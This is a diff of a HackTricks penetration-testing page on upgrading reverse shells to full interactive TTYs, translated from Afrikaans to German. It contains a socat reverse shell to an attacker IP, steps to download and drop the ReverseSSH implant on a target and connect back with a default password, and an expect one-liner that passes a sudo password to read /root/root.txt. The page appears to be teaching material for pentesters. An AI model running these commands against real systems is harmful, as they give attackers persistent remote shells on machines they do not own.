@@ -1,29 +1,29 @@
-# Volle TTYs
+# Full TTYs
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+Vertiefen Sie Ihr Fachwissen in **Mobile Security** mit der 8kSec Academy. Meistern Sie die Sicherheit von iOS und Android durch unsere selbstgesteuerten Kurse und erhalten Sie ein Zertifikat:
 
 {% embed url="https://academy.8ksec.io/" %}
 
-## Volle TTY
+## Full TTY
 
-Let daarop dat die skulp wat jy in die `SHELL` veranderlike stel **moet** wees **lys binne** _**/etc/shells**_ of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook daarop dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die skulp verkry deur `bash` te loop.
+Beachten Sie, dass die Shell, die Sie in der `SHELL`-Variablen festlegen, **in** _**/etc/shells**_ **aufgelistet sein muss** oder `Der Wert für die SHELL-Variable wurde in der /etc/shells-Datei nicht gefunden. Dieser Vorfall wurde gemeldet`. Beachten Sie auch, dass die nächsten Snippets nur in bash funktionieren. Wenn Sie in einer zsh sind, wechseln Sie zu einer bash, bevor Sie die Shell mit `bash` abrufen.
 
 #### Python
 
@@ -36,7 +36,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-Jy kan die **aantal** **rye** en **kolomme** kry deur **`stty -a`** uit te voer
+Sie können die **Anzahl** der **Zeilen** und **Spalten** durch Ausführen von **`stty -a`** erhalten.
 {% endhint %}
 
 #### script
@@ -73,11 +73,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te laat val.
+Eine bequeme Möglichkeit für **interaktive Shell-Zugriffe**, sowie **Dateiübertragungen** und **Portweiterleitungen**, ist das Ablegen des statisch verlinkten ssh-Servers [ReverseSSH](https://github.com/Fahrj/reverse-ssh) auf dem Ziel.
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Unten ist ein Beispiel für `x86` mit upx-komprimierten Binärdateien. Für andere Binärdateien, siehe die [Release-Seite](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
+1. Bereiten Sie sich lokal vor, um die ssh-Portweiterleitungsanfrage abzufangen:
 
 {% code overflow="wrap" %}
 ```bash
@@ -88,7 +88,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2a) Linux teiken:
+* (2a) Linux-Ziel:
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,7 +99,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Windows 10 teiken (vir vroeëre weergawes, kyk na [projek leesmy] (https://github.com/Fahrj/reverse-ssh#features)):
+* (2b) Windows 10 Ziel (für frühere Versionen, siehe [Projekt-Readme](https://github.com/Fahrj/reverse-ssh#features)):
 
 {% code overflow="wrap" %}
 ```bash
@@ -110,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* As die ReverseSSH poort forwarding versoek suksesvol was, behoort jy nou in staat te wees om in te log met die standaard wagwoord `letmeinbrudipls` in die konteks van die gebruiker wat `reverse-ssh(.exe)` uitvoer:
+* Wenn die ReverseSSH-Portweiterleitungsanfrage erfolgreich war, sollten Sie sich jetzt mit dem Standardpasswort `letmeinbrudipls` im Kontext des Benutzers, der `reverse-ssh(.exe)` ausführt, anmelden können:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -120,33 +120,33 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) werk outomaties Linux reverse shells op na TTY, hanteer die terminalgrootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.
+[Penelope](https://github.com/brightio/penelope) aktualisiert automatisch Linux-Reverse-Shells auf TTY, verwaltet die Terminalgröße, protokolliert alles und vieles mehr. Außerdem bietet es readline-Unterstützung für Windows-Shells.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
-## Geen TTY
+## Kein TTY
 
-As jy om een of ander rede nie 'n volle TTY kan verkry nie, kan jy **nog steeds met programme interaksie hê** wat gebruikersinvoer verwag. In die volgende voorbeeld word die wagwoord aan `sudo` gegee om 'n lêer te lees:
+Wenn Sie aus irgendeinem Grund kein vollständiges TTY erhalten können, **können Sie dennoch mit Programmen interagieren**, die Benutzereingaben erwarten. Im folgenden Beispiel wird das Passwort an `sudo` übergeben, um eine Datei zu lesen:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+Vertiefen Sie Ihr Fachwissen in **Mobile Security** mit der 8kSec Academy. Meistern Sie die Sicherheit von iOS und Android durch unsere selbstgesteuerten Kurse und erhalten Sie ein Zertifikat:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
